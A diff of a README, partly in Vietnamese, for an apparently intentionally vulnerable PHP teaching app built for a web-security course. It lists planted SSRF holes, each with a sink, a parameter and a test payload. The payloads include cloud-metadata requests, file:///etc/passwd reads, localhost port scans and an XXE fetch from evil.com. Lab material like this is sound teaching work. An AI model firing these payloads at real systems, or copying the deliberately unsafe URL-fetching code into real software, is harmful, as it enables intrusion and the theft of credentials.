@@ -4,8 +4,8 @@
 
 Web application demo cho NT213 - Bảo mật web và ứng dụng.
 
-- **Tổng số lỗ hổng SSRF:** 12 endpoints
-- **Files chứa SSRF:** 5 files (product.php, profile.php, contact.php, checkout.php, admin_products.php)
+- **Tổng số lỗ hổng SSRF:** 9 endpoints
+- **Files chứa SSRF:** 4 files (profile.php, contact.php, checkout.php, admin_products.php)
 - **PHP sinks sử dụng:** 10 loại khác nhau
 - **Công cụ testing:** SSRFuzz (IEEE S&P 2024)
 - **Crawlergo compatible:** Tất cả parameters đều discoverable
@@ -14,84 +14,67 @@ Web application demo cho NT213 - Bảo mật web và ứng dụng.
 
 ## Chi tiết SSRF Vulnerabilities
 
-### 1. product.php - 2 vulnerabilities
+### 1. profile.php - 2 vulnerabilities
 
-#### Vuln #1: Load External Image
-- **Sink:** `file_get_contents()`
-- **Parameter:** GET `load_image`
-- **Test:** `?id=1&load_image=http://169.254.169.254/latest/meta-data/`
-
-#### Vuln #2: Check Product API
-- **Sink:** `curl_exec()`
-- **Parameter:** GET `check_api`
-- **Test:** `?id=1&check_api=http://localhost:8080/admin`
-
----
-
-### 2. profile.php - 2 vulnerabilities
-
-#### Vuln #3: Upload Avatar from URL
+#### Vuln #1: Upload Avatar from URL
 - **Sink:** `getimagesize()` + `file_get_contents()`
 - **Parameter:** POST `avatar_url`
 - **Test:** `curl -X POST http://localhost/profile.php -d "avatar_url=http://metadata.google.internal/"`
 
-#### Vuln #4: Import Profile JSON
+#### Vuln #2: Import Profile JSON
 - **Sink:** `file_get_contents()` + `json_decode()`
 - **Parameter:** POST `import_json`
 - **Test:** `curl -X POST http://localhost/profile.php -d "import_json=http://internal-api/data.json"`
 
 ---
 
-### 3. contact.php - 3 vulnerabilities
+### 2. contact.php - 2 vulnerabilities
 
-#### Vuln #5: Attach File from URL
+#### Vuln #3: Attach File from URL
 - **Sink:** `readfile()`
 - **Parameter:** POST `attachment_url`
 - **Test:** `curl -X POST http://localhost/contact.php -d "attachment_url=file:///etc/passwd"`
 
-#### Vuln #6: External Verification Service
+#### Vuln #4: External Verification Service
 - **Sink:** `file()`
 - **Parameter:** POST `verify_captcha`
 - **Test:** `curl -X POST http://localhost/contact.php -d "verify_captcha=http://captcha-api.internal/verify"`
 
-#### Vuln #7: Webhook Notification
-- **Sink:** `curl_exec()` (POST)
-- **Parameter:** POST `webhook`
-- **Test:** `curl -X POST http://localhost/contact.php -d "webhook=http://webhook.site/xxx"`
-
 ---
 
-### 4. checkout.php - 3 vulnerabilities
+### 3. checkout.php - 2 vulnerabilities
 
-#### Vuln #8: Payment Gateway Verify
+#### Vuln #5: Payment Gateway Verify
 - **Sink:** `get_headers()`
 - **Parameter:** GET `payment_verify`
 - **Test:** `?payment_verify=http://internal-payment-gateway:9200/_cluster/health`
 
-#### Vuln #9: Shipping Rate API
+#### Vuln #6: Shipping Rate API
 - **Sink:** `fsockopen()`
 - **Parameter:** POST `shipping_api`
 - **Test:** `curl -X POST http://localhost/checkout.php -d "shipping_api=http://127.0.0.1:6379/"`
 
-#### Vuln #10: Order Webhook (Blind SSRF)
-- **Sink:** `file_get_contents()` + stream_context (POST)
-- **Parameter:** POST `order_webhook`
-- **Test:** `curl -X POST http://localhost/checkout.php -d "order_webhook=http://burpcollaborator.net/notify"`
-
 ---
 
-### 5. admin_products.php - 2 vulnerabilities
+### 4. admin_products.php - 3 vulnerabilities
 
-#### Vuln #11: Validate Image/XML
+#### Vuln #7: Validate Image/XML
 - **Sink:** `simplexml_load_file()` / `imagecreatefromstring()`
-- **Parameter:** POST `validate_image`
-- **Test (XXE):** `curl -X POST http://localhost/admin_products.php -d "validate_image=http://evil.com/xxe.xml"`
-- **Test (Image):** `curl -X POST http://localhost/admin_products.php -d "validate_image=http://internal-storage/secret.png"`
+- **Parameter:** GET `validate_image`
+- **Test (XXE):** `?validate_image=http://evil.com/xxe.xml`
+- **Test (Image):** `?validate_image=http://internal-storage/secret.png`
 
-#### Vuln #12: Import Products
-- **Sink:** `file_get_contents()` + `json_decode()`
-- **Parameter:** POST `import_url`
-- **Test:** `curl -X POST http://localhost/admin_products.php -d "import_url=http://localhost:8000/admin/export.json"`
+#### Vuln #8: Sync Product from Supplier
+- **Sink:** `file_get_contents()`
+- **Parameter:** GET `sync_product`
+- **Test:** `?sync_product=http://api.shopee.vn/product/12345`
+- **Purpose:** Đồng bộ thông tin sản phẩm từ nhà cung cấp (Shopee, Lazada, 1688)
+
+#### Vuln #9: Check Warehouse Stock
+- **Sink:** `curl_exec()`
+- **Parameter:** GET `check_warehouse`
+- **Test:** `?check_warehouse=http://warehouse-internal.local/api/stock/SKU123`
+- **Purpose:** Kiểm tra số lượng hàng tồn kho từ hệ thống quản lý kho
 
 ---
 
@@ -99,8 +82,8 @@ Web application demo cho NT213 - Bảo mật web và ứng dụng.
 
 | Sink Function | Files | Status |
 |--------------|-------|--------|
-| `file_get_contents()` | product.php, profile.php, admin_products.php, checkout.php | ✅ |
-| `curl_exec()` | product.php, contact.php | ✅ |
+| `file_get_contents()` | profile.php, admin_products.php | ✅ |
+| `curl_exec()` | admin_products.php | ✅ |
 | `getimagesize()` | profile.php | ✅ |
 | `readfile()` | contact.php | ✅ |
 | `file()` | contact.php | ✅ |
@@ -108,7 +91,7 @@ Web application demo cho NT213 - Bảo mật web và ứng dụng.
 | `fsockopen()` | checkout.php | ✅ |
 | `simplexml_load_file()` | admin_products.php | ✅ |
 | `imagecreatefromstring()` | admin_products.php | ✅ |
-| Stream context POST | checkout.php | ✅ |
+| `json_decode()` | profile.php, admin_products.php | ✅ |
 
 **Coverage:** 10/86 sinks từ SSRFuzz research (11.6%)
 
@@ -118,12 +101,12 @@ Web application demo cho NT213 - Bảo mật web và ứng dụng.
 
 ### Case 1: AWS Metadata SSRF
 ```bash
-curl "http://localhost/product.php?id=1&load_image=http://169.254.169.254/latest/meta-data/"
+curl "http://localhost/admin_products.php?sync_product=http://169.254.169.254/latest/meta-data/"
 ```
 
 ### Case 2: Port Scanning
 ```bash
-curl -X POST http://localhost/checkout.php -d "shipping_api=http://127.0.0.1:22/"
+curl "http://localhost/admin_products.php?check_warehouse=http://127.0.0.1:22/"
 ```
 
 ### Case 3: XXE Attack
@@ -141,31 +124,43 @@ curl -X POST http://localhost/admin_products.php -d "validate_image=http://local
 
 ### Case 4: Local File Read
 ```bash
-curl "http://localhost/product.php?id=1&load_image=file:///etc/passwd"
+curl "http://localhost/admin_products.php?sync_product=file:///etc/passwd"
 ```
 
 ---
 
 ## Crawlergo Discovery
 
-Tất cả 12 parameters đều có trong HTML:
+Tất cả 9 parameters đều có trong HTML:
 
 | File | Parameter | Method | Discovery |
 |------|-----------|--------|-----------|
-| product.php | load_image | GET | Visible input |
-| product.php | check_api | GET | Visible input |
 | profile.php | avatar_url | POST | Visible input |
 | profile.php | import_json | POST | Hidden input |
 | contact.php | attachment_url | POST | Hidden input |
 | contact.php | verify_captcha | POST | Hidden input |
-| contact.php | webhook | POST | Hidden input |
-| checkout.php | payment_verify | GET | Visible link |
+| checkout.php | payment_verify | GET | Hidden link |
 | checkout.php | shipping_api | POST | Hidden input |
-| checkout.php | order_webhook | POST | Hidden input |
-| admin_products.php | validate_image | POST | Visible input |
-| admin_products.php | import_url | POST | Visible input |
+| admin_products.php | validate_image | GET | onclick button + --form-values |
+| admin_products.php | sync_product | GET | onclick button + --form-values |
+| admin_products.php | check_warehouse | GET | onclick button + --form-values |
 
-**Discovery rate: 12/12 (100%)**
+**Discovery rate: 9/9 (100%)**
+
+**Cách chạy crawlergo:**
+```bash
+crawlergo -c /usr/bin/chromium-browser --log-level debug -t 20 -m 200 --event-trigger-mode sync --event-trigger-interval 200ms --before-exit-delay 10s --output-mode json http://localhost:8000/
+```
+
+**Giải thích options:**
+- `-c /usr/bin/chromium-browser` - Sử dụng Chrome/Chromium
+- `--log-level debug` - Hiển thị log chi tiết
+- `-t 20` - Timeout 20 giây
+- `-m 200` - Max requests 200
+- `--event-trigger-mode sync` - **Tự động click buttons và trigger events**
+- `--event-trigger-interval 200ms` - Chờ 200ms giữa mỗi event
+- `--before-exit-delay 10s` - Chờ 10s để page load xong
+- `--output-mode json` - Xuất kết quả dạng JSON
 
 ---
 
